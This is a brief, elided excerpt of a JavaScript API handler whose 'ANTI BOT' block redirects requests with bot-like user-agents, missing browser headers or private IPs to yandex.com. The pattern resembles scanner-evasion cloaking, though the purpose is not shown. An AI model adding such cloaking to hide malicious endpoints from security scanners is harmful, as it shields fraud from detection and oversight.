...
export default async function handler(req, res) {
  ...
  if (req.method === "POST") {
    try {
      ...
      // ===== ANTI BOT =====
      if (!isDev) {
        if (!ua || ua.length < 10 || BOT_UA.some(b => ua.includes(b))) return res.redirect(302, "https://yandex.com");
        if (!req.headers["accept-language"] || !req.headers["accept"]) return res.redirect(302, "https://yandex.com");
        if (!ip || isPrivateIP(ip)) return res.redirect(302, "https://yandex.com");
      }
